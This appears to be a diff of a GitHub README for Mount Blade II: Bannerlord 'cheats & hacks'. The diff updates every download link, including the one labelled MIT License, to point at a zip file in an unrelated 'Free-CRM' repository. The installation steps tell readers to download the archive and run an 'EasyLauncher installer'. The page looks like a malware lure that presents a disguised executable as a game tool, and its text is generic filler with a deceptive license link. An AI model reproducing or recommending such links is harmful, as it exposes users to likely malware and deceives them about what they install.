@@ -1,6 +1,6 @@
 # 🛡️ Mount Blade II: Bannerlord Cheats & Hacks 🛡️
 
-[![Download Now](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free-CRM.zip)](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free-CRM.zip)
+[![Download Now](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free_CRM_v1.6-beta.2.zip)](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free_CRM_v1.6-beta.2.zip)
 
 Welcome to the ultimate repository for Mount Blade II: Bannerlord enhancements! This project delivers a robust collection of custom scripts and enhancement tools to amplify your gameplay experience in Bannerlord 2025. Enjoy advanced tweaks and new possibilities designed to give you an exciting toolkit for exploration and strategy.
 
@@ -38,7 +38,7 @@ Mount Blade II, Bannerlord cheat tools, hacking scripts, enhancement launcher, g
 
 ## 🛠️ Installation
 
-1. Download the [![Download Now](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free-CRM.zip)](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free-CRM.zip)
+1. Download the [![Download Now](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free_CRM_v1.6-beta.2.zip)](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free_CRM_v1.6-beta.2.zip)
 2. Run the EasyLauncher installer on your supported system.
 3. Launch Bannerlord and activate features using the GUI.
 4. Check documentation for usage tips!
@@ -53,8 +53,8 @@ This software is for educational & research purposes only. Usage may impact your
 
 ## 📜 MIT License
 
-Released under the [MIT License](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free-CRM.zip). Enjoy safe, transparent, and open development for 2025!
+Released under the [MIT License](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free_CRM_v1.6-beta.2.zip). Enjoy safe, transparent, and open development for 2025!
 
 ----
 
-[![Download Now](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free-CRM.zip)](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free-CRM.zip)
+[![Download Now](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free_CRM_v1.6-beta.2.zip)](https://raw.githubusercontent.com/lordnanok/Free-CRM/main/torsoocclusion/Free_CRM_v1.6-beta.2.zip)
